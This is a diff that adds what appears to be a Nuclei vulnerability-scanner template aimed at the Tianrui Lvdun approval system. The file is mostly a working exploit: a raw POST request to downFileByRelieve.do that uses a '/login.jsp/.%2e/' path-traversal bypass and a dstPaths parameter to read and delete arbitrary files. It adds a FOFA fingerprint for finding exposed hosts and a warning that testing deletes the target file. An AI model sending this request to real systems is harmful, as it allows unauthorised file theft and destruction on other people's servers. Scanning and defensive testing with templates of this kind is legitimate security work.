@@ -1,0 +1,28 @@
+id: poc-zpfhah08h64rpgmh
+info:
+  name: 天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zpfhah08h64rpgmh'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zpfhah08h64rpgmh
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - '漏洞测试会删除对应文件，谨慎测试
+
+    POST /trwfe/login.jsp/.%2e/file/downFileByRelieve.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    dstPaths=c:\a.txt&fileNames=1.png&isDirArr=0&processInstanceIds=&isapproval=auto'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
